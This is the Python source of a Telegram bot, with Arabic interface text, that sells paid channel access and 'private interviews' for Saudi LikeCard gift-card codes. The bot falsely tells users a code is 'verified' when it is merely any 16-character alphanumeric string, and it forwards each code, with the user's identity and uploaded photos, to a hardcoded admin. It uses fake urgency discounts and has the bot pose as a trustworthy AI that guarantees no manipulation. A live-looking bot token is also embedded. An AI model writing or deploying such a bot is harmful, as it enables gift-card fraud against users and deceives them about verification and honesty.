import telebot
from telebot import types
from flask import Flask
from threading import Thread

# توكن البوت
bot = telebot.TeleBot('8901455370:AAF35Amt2olwb_sUAlLzG9oagIDJiHT-doo')
ADMIN_ID = 7180588622

# --- إضافة سيرفر ويب لضمان عمل البوت 24/7 ---
app = Flask('')
@app.route('/')
def home():
    return "Bot is running!"

def run():
    app.run(host='0.0.0.0', port=8080)

t = Thread(target=run)
t.start()
# --------------------------------------------

# القائمة الرئيسية
def main_menu(chat_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row(types.KeyboardButton("حالة العضوية"), types.KeyboardButton("انضمام"))
    markup.row(types.KeyboardButton("طريقة الاشتراك 💳"), types.KeyboardButton("المقابلات 🎙️"))
    markup.row(types.KeyboardButton("الضمان 🛡️"), types.KeyboardButton("Rules 📜"))
    
    bot.send_message(
        chat_id,
        "🎛️ اختر القسم المناسب من الأزرار بالأسفل:",
        reply_markup=markup
    )

# رسالة الترحيب
@bot.message_handler(commands=['start'])
def start(message):
    text = (
        "🎀 أهلاً فيك في عالم قناة\n"
        "سابقاً طاغـي♠️ 𝙌𝙐𝙀𝙀𝙉🎀\n\n"
        "تم تصميم هذا البوت لخدمتك وإدارة الاشتراكات والمقابلات بكل سهولة وخصوصية 🤝\n\n"
        "من خلال الأزرار بالأسفل تقدر:\n"
        "• تشوف حالة عضويتك\n• تشترك بالقناة\n• تتعرف على طريقة الاشتراك\n• تطلب مقابلة خاصة\n• تطلع على القوانين والضمانات\n\n"
        "🎁 وإذا كانت هذه أول مرة لك بالاشتراك، فقد حصلت على خصم خاص لفترة محدودة 🔥\n"
        "أصبح سعر الاشتراك الدائم:\n150 ريال بدلاً من 200 ريال 💳\n\n"
        "📌 اختر أحد الخيارات بالأسفل للمتابعة."
    )
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("أريد الخصم", "تجاهل")
    bot.send_message(message.chat.id, text, reply_markup=markup)
    main_menu(message.chat.id)

# معالجة الصور والملفات
@bot.message_handler(content_types=['photo', 'document'])
def handle_files(message):
    chat_id = message.chat.id
    username = message.from_user.username or "لا يوجد"
    
    bot.send_message(ADMIN_ID, f"📸 طلب جديد (صورة/ملف) من:\n👤 المستخدم: @{username}\n🆔 ID: {chat_id}")
    
    if message.content_type == 'photo':
        bot.send_photo(ADMIN_ID, message.photo[-1].file_id)
    elif message.content_type == 'document':
        bot.send_document(ADMIN_ID, message.document.file_id)
        
    bot.send_message(chat_id, "✅ تم استلام ملفك/صورتك، جاري مراجعتها من الإدارة 🤝")

# معالجة النصوص
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    txt = message.text
    chat_id = message.chat.id

    if txt == "أريد الخصم":
        bot.send_message(chat_id, "✅ رائع! تم تفعيل الخصم الخاص بحسابك.\nيرجى الآن إرسال رقم بطاقة LikeCard السعودية هنا لإكمال تفعيل اشتراكك مباشرة 💳\n\n📌 ملاحظة:\n• يجب أن يكون الرمز مكونًا من 16 حرفًا ورقمًا فقط")

    elif txt == "تجاهل":
        main_menu(chat_id)

    elif txt == "حالة العضوية":
        bot.send_message(chat_id, "📌 حالة العضوية\n\n• لا يوجد لديك عضوية حالياً ❌\n• تم منحك خصم خاص على الاشتراك الدائم 🔥\n• أصبح سعر الاشتراك الدائم:\n150 ريال بدلاً من 200 ريال 💳")

    elif txt == "انضمام":
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.row("شهري", "دائم")
        markup.row("رجوع 🔙")
        bot.send_message(chat_id, "💳 اختر نوع الاشتراك المناسب لك:", reply_markup=markup)

    elif txt == "شهري":
        bot.send_message(chat_id, "💳 الاشتراك الشهري\n\n• قيمة الاشتراك: 100 ريال\n• طريقة الدفع: بطاقة LikeCard السعودية")

    elif txt == "دائم":
        bot.send_message(chat_id, "💳 الاشتراك الدائم\n\n• قيمة الاشتراك: 200 ريال\n• طريقة الدفع: بطاقة LikeCard السعودية")

    elif txt == "رجوع 🔙":
        main_menu(chat_id)

    elif txt == "طريقة الاشتراك 💳":
        bot.send_message(chat_id, "📖 أهلاً بك في عالم النخبة الخاص بقناة\nسابقاً طاغـي♠️ 𝙌𝙐𝙀𝙀𝙉🎀\n\nطريقة الدفع الوحيدة المعتمدة هي:\n💳 بطاقة LikeCard السعودية\n\nالاشتراكات المتوفرة:\n• الاشتراك الشهري — 100 ريال\n• الاشتراك الدائم — 200 ريال\n\nطريقة شراء البطاقة:\n1• افتح تطبيق LikeCard وسجل دخولك\n2• اكتب: بطاقة LikeCard السعودية\n3• اختر القيمة وأكمل الدفع\n4• أرسل رقم البطاقة المكون من 16 حرفًا ورقمًا لتفعيل اشتراكك مباشرة ✅")

    elif txt == "المقابلات 🎙️":
        bot.send_message(chat_id, "🎙️ المقابلات الخاصة\n\nطريقة الحجز الوحيدة هي إرسال بطاقة LikeCard السعودية بقيمة 500 ريال.\n\nبعد إرسال البطاقة يتم تحويل طلبك مباشرة إلى إدارة القناة وسيتم التواصل معك لاحقاً لتنسيق الوقت بكل خصوصية 🤝\n\n📌 ملاحظة: موعد المقابلة يكون بعد شراء البطاقة بحوالي 10 أيام ✅")

    elif txt == "الضمان 🛡️":
        bot.send_message(chat_id, "🛡️ ضمان الاشتراك\n\nأنا هنا كذكاء اصطناعي لخدمتك وإدارة اشتراكات القناة بكل مصداقية وخصوصية 🤝\nلا يوجد أي تلاعب أو تأخير متعمد، وبمجرد إرسال بطاقة LikeCard الصحيحة والتحقق منها يتم تسجيل اشتراكك مباشرة بالنظام ✅\n\n📌 الاشتراك الشهري: ينتهي تلقائياً بعد شهر.\n📌 اشتراك الدعم/الدائم: يتم حفظ اليوزر ولن يتم إزالة حسابك 💳")

    elif txt == "Rules 📜":
        bot.send_message(chat_id, "📜 قوانين القناة\n\n• يمنع تصوير أو نشر أي محتوى موجود داخل القناة خارجها ❌\n• يمنع حفظ أو تعديل المقاطع والصور ❌\n• أي استخدام خاطئ للمحتوى يعرض عضويتك للإزالة المباشرة.\n• هذه القناة مبنية على الثقة والاحترام المتبادل 🤝")

    elif len(txt) == 16 and any(c.isdigit() for c in txt) and any(c.isalpha() for c in txt):
        bot.send_message(chat_id, "✅ تم استلام بطاقتك بنجاح. تم التحقق منها وسيتم إدخالك للقناة مباشرة 🤝")
        bot.send_message(ADMIN_ID, f"💳 بطاقة جديدة تم استلامها:\n👤 المستخدم: @{message.from_user.username}\n🆔 ID: {chat_id}\n🔑 الرمز: {txt}")

    else:
        bot.send_message(chat_id, "❌ عذرًا، البطاقة غير صحيحة. يرجى إرسال رقم البطاقة المكون من 16 حرفًا ورقمًا، أو أرسل صورة للبطاقة إذا كنت تفضل ذلك 💳")

bot.infinity_polling()
